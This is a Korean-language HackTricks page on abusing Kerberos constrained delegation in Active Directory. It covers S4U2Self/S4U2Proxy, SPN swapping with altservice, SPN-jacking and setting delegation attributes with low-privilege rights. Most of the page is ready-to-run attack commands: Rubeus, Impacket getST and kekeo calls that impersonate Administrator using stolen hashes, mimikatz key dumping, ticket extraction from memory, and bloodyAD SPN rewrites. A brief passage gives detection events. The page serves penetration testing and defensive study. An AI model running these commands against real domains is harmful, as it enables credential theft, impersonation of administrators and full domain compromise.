# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

이를 사용하면 Domain admin이 컴퓨터가 머신의 모든 **service**에 대해 **user 또는 computer를 impersonate**하도록 **허용**할 수 있습니다.

- **Service for User to self (_S4U2self_):** **SPN을 소유한 모든 service account**는 일반적으로 임의의 user를 대신하여 자신에 대한 TGS를 얻을 수 있습니다. 해당 account의 _userAccountControl_에 [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D)이 설정되어 있으면 해당 TGS는 **forwardable**이 됩니다. 이 특성 때문에 protocol transition이 **classic constrained delegation**에 직접적으로 유용합니다.
- **Service for User to Proxy(_S4U2proxy_):** **service account**는 **msDS-AllowedToDelegateTo**에 나열된 SPN에 대해 user를 대신하는 TGS를 얻을 수 있습니다. S4U2Proxy에서 사용하는 evidence ticket은 delegating service로 전달되는 **forwardable** ticket이어야 합니다. 이는 victim에서 캡처한 실제 client-to-service ticket이거나 **S4U2Self + T2A4D**로 생성된 ticket일 수 있습니다.

**참고**: AD에서 user가 ‘_Account is sensitive and cannot be delegated_’로 표시되어 있거나 **Protected Users**의 구성원인 경우, 일반적으로 constrained delegation을 통해 해당 user를 **impersonate**할 수 없습니다. 최신 domain에서는 delegation이 활성화된 account를 대상으로 할 때 RC4만을 가정하기보다 **AES** material을 우선 사용해야 합니다.

즉, **service의 hash를 compromise**하면 **users를 impersonate**하고, 지정된 머신을 통해 해당 users를 대신하여 모든 **service**에 **access**할 수 있습니다(잠재적인 **privesc**).

또한 user가 impersonate할 수 있는 service뿐만 아니라 **모든 service**에 access할 수 있습니다. 요청된 service 이름인 SPN이 검사되지 않기 때문입니다(티켓에서 이 부분은 암호화되거나 서명되지 않습니다). 따라서 **CIFS service**에 access할 수 있다면, 예를 들어 Rubeus에서 `/altservice` flag를 사용하여 **HOST service**에도 access할 수 있습니다. 동일한 SPN swapping weakness는 **Impacket getST -altservice** 및 기타 tooling에서도 악용됩니다.

또한 **DC의 LDAP service access**는 **DCSync**를 exploit하는 데 필요한 요소입니다.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Linux / LDAP enumeration
# NetExec: enumerate constrained / unconstrained / RBCD in one shot
nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation

# bloodyAD / msldap: LDAP-first enumeration from Linux
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
```
**Operator 참고:** **gMSA/sMSA** 검토 시 **ADUC** 또는 BloodHound 스크린샷만 믿지 마세요. 이러한 계정은 일반적인 Delegation 탭을 숨기는 경우가 많으므로, 원시 **`userAccountControl`** 및 **`msDS-AllowedToDelegateTo`** attribute를 직접 열거하세요.
```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Protocol-transition vs Kerberos-only constrained delegation

침해된 계정에 **T2A4D**가 있으면 일반적으로 service key/TGT만으로 전체 **`S4U2Self -> S4U2Proxy`** chain을 완료할 수 있습니다.<sup>[[2]](#references)</sup>

**`msDS-AllowedToDelegateTo`**만 있는 경우(기존 **"Use Kerberos only"** mode)에도 delegation을 악용할 수 있지만, S4U2Proxy의 evidence ticket은 delegating service를 대상으로 한 **실제 forwardable user-to-service ticket**이어야 합니다. 실제로는 피해자의 TGS를 **LSASS/ccache**에서 훔치거나 캡처한 뒤 두 번째 단계(`/tgs:` in Rubeus)에 전달해야 합니다. **non-forwardable** S4U2Self ticket은 classic constrained delegation에 충분하지 않습니다. 이것이 유일한 evidence ticket이라면 대신 [Resource-based Constrained Delegation](resource-based-constrained-delegation.md)을 확인하세요.<sup>[[2]](#references)</sup>

### Cross-domain constrained delegation 참고 사항 (2025+)

**Windows Server 2012/2012 R2**부터 KDC는 S4U2Proxy extensions를 통해 domain/forest 간 constrained delegation을 지원합니다. 최신 build(Windows Server 2016–2025)에서도 이 동작을 유지하며 protocol transition을 나타내는 두 개의 PAC SID를 추가합니다.<sup>[[1]](#references)</sup>

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**)는 사용자가 정상적으로 인증된 경우입니다.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**)는 service가 protocol transition을 통해 identity를 assertion한 경우입니다.

domain 간 protocol transition이 사용되면 PAC 내부에서 `SERVICE_ASSERTED_IDENTITY`를 확인할 수 있으며, 이는 S4U2Proxy 단계가 성공했음을 의미합니다.<sup>[[1]](#references)</sup>

### Impacket / Linux tooling (altservice & full S4U)

최신 Impacket(0.11.x+)은 Rubeus와 동일한 S4U chain 및 SPN swapping을 제공합니다.<sup>[[2]](#references)</sup>
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'

# If you already have a ticket/ccache for the right host, rewrite only the service class offline
# (same SPN-swapping idea as Rubeus /altservice)
tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
export KRB5CCNAME=Administrator_HOST.ccache
```
오프라인 hash만 있는 경우처럼 사용자 ST를 먼저 위조하려면 **ticketer.py**를 **getST.py**와 함께 사용하여 S4U2Proxy를 수행합니다. 이미 작동하는 ccache가 있고 동일한 호스트의 service class만 교체하면 되는 경우에는 **tgssub.py**도 유용합니다. 현재의 특이 사항은 공개된 Impacket issue #1713을 참고하십시오(위조한 ST가 SPN key와 일치하지 않을 때 발생하는 KRB_AP_ERR_MODIFIED).<sup>[[2]](#references)</sup>

### SPN-jacking: constrained-delegation target 리디렉션

기존의 constrained delegation은 변경할 수 없는 target SID가 아니라 `msDS-AllowedToDelegateTo`의 **SPN string**을 승인합니다. S4U2Proxy 중에 KDC는 현재 해당 SPN을 소유한 account를 확인하고, 그 account의 long-term key로 service ticket을 암호화합니다. 따라서 delegating account를 제어하고 다른 service/computer account에 대해 `WriteSPN`을 보유하면 `SeEnableDelegationPrivilege` 없이도 변경되지 않은 delegation constraint를 리디렉션할 수 있습니다.<sup>[[5]](#references)[[6]](#references)</sup>

두 가지 variant가 존재합니다.<sup>[[5]](#references)</sup>

- **Ghost SPN-jacking:** 이전 owner가 삭제되거나 이름이 변경되었거나 SPN이 제거되어 allowed SPN이 orphaned된 경우입니다. 해당 SPN을 원하는 target account에 직접 추가합니다.
- **Live SPN-jacking:** SPN이 여전히 source account에 속한 경우입니다. Duplicate-SPN validation은 일반적으로 destination에 대한 write를 차단하므로 두 object 모두에 `WriteSPN`이 필요합니다. source에서 제거하고 target에 추가한 뒤 ticket을 획득하고, 원래 registration을 복원합니다.

다음의 추상화된 Linux flow는 allowed SPN을 이동하고, 손상된 delegating principal로 S4U를 실행한 다음, 새 target에서 유용한 service에 맞도록 ticket의 service name을 다시 작성합니다.<sup>[[5]](#references)[[6]](#references)</sup>
```bash
# Omit this deletion for a ghost SPN
bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
msldap delspn "$SOURCE_DN" "$DELEGATED_SPN"

bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
msldap addspn "$TARGET_DN" "$DELEGATED_SPN"

getST.py -dc-ip "$DC_IP" -spn "$DELEGATED_SPN" \
-impersonate Administrator -altservice "cifs/$TARGET_FQDN" \
"$DOMAIN/$DELEGATING_ACCOUNT:$DELEGATING_PASSWORD"
```
`-altservice`는 두 번째로 별개의 primitive입니다. S4U2Proxy ticket은 이제 `$DELEGATED_SPN`을 소유하는 account를 대상으로 암호화됩니다. ticket service name(`sname`)은 암호화된 ticket body 외부에 있으므로, tooling은 동일한 account key를 사용하는 다른 service class/hostname으로 대체할 수 있습니다. SPN-jacking은 먼저 ticket을 보호하는 **account key**가 **어느 것인지** 변경하고, service-class substitution은 해당 ticket이 **어디에 제시되는지** 변경합니다.<sup>[[5]](#references)[[6]](#references)</sup>

live jacking의 경우 정상적인 service가 중단되지 않도록 ticket acquisition 직후 두 LDAP write를 원래대로 되돌립니다. computer-account auditing이 활성화된 DC에서는 한 computer에서 `servicePrincipalName`이 제거된 직후 다른 computer에 추가되는 Security event **4742**를 탐지합니다. 특히 SPN hostname이 destination의 `dNSHostName`과 다른 경우를 확인합니다. 이를 event **4769**와 상관 분석합니다. S4U2Self에서는 client와 service가 동일한 account로 나타나고, S4U2Proxy에서는 **Transited Services**가 채워집니다.<sup>[[5]](#references)</sup>

### low-priv creds로 delegation 설정 자동화

computer 또는 service account에 대해 이미 **GenericAll/WriteDACL**을 보유하고 있다면, **bloodyAD**(2024+)를 사용하여 RSAT 없이 필요한 attributes를 원격으로 설정할 수 있습니다:
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
이렇게 하면 해당 attributes에 write 권한을 확보하는 즉시 DA privileges 없이 privesc를 위한 constrained delegation path를 구축할 수 있습니다.

- Step 1: **허용된 서비스의 TGT 획득**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> 컴퓨터에서 SYSTEM 권한 없이 **TGT ticket** 또는 **RC4**나 **AES256**을 획득하는 다른 방법도 있습니다. 예를 들면 Printer Bug와 unconstrain delegation, NTLM relaying, Active Directory Certificate Service abuse 등이 있습니다.
>
> **해당 TGT ticket(또는 해시)만 있으면 컴퓨터 전체를 compromise하지 않고도 이 공격을 수행할 수 있습니다.**

- Step2: **사용자를 impersonate하여 해당 service에 대한 TGS 획득**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the constrained-delegation user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**ired.team에서 더 많은 정보를 확인할 수 있습니다.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) 및 [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)<sup>[[3]](#references)[[4]](#references)</sup>

## References

- [1] [Kerberos Constrained Delegation 개요 (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [2] [Impacket을 사용한 Delegation 악용 (Part 2): Constrained Delegation (Black Hills, 2025)](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
- [3] [Kerberos Constrained Delegation (ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
- [4] [Kerberosity Killed the Domain: Offensive Kerberos 개요 (SpecterOps)](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [5] [Elad Shamir - SPN-jacking: WriteSPN Abuse의 특수 사례](https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/)
- [6] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
{{#include ../../banners/hacktricks-training.md}}
